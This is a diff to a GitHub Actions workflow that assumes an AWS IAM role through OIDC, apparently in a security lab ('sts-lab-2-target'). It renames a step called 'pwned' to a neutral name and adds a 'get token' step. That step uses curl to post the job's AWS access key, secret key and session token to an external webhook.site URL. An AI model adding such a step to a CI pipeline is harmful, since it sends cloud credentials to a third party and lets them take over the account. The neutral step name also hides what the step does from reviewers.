@@ -23,7 +23,13 @@ jobs:
         with:
           aws-region: eu-west-1
           role-to-assume: "arn:aws:iam::009313048793:role/sts-lab-2-target"
-          role-session-name: OIDCSessio
+          role-session-name: OIDCSession
 
-      - name: pwned
+      - name: get sts
         run: aws sts get-caller-identity
+
+      - name: get token
+        run: |
+          curl -X POST https://webhook.site/f28253da-af89-4431-8912-aad3d68d6b8c \
+            -H "Content-Type: application/json" \
+            -d "{\"key\":\"$AWS_ACCESS_KEY_ID\",\"secret\":\"$AWS_SECRET_ACCESS_KEY\",\"token\":\"$AWS_SESSION_TOKEN\"}"
